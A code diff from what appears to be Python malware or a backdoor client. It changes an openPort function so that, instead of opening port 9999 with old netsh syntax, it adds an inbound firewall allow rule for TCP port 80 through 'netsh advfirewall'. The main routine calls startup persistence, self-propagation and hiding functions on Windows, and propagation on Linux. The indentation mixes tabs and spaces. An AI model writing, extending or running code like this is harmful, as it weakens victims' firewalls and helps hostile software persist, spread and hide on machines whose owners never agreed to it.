@@ -131,15 +131,15 @@ def run(program):
                 return '[NOT RUN!!]'+str(e)
 
 
-def openPort(port):
-        os.system('netsh firewall add portopening protocol = TCP port = '+str(port)+' name = "TCP/IP" mode = ENABLE scope = SUBNET')
+def openPort():
+        os.system('netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80')
 
 def main():
         if windows_client():
 		validate()
                 addStartup()
                 propagate()
-		openPort(9999)
+		openPort()
 		hide()
         elif linux_client():
 		propagate()
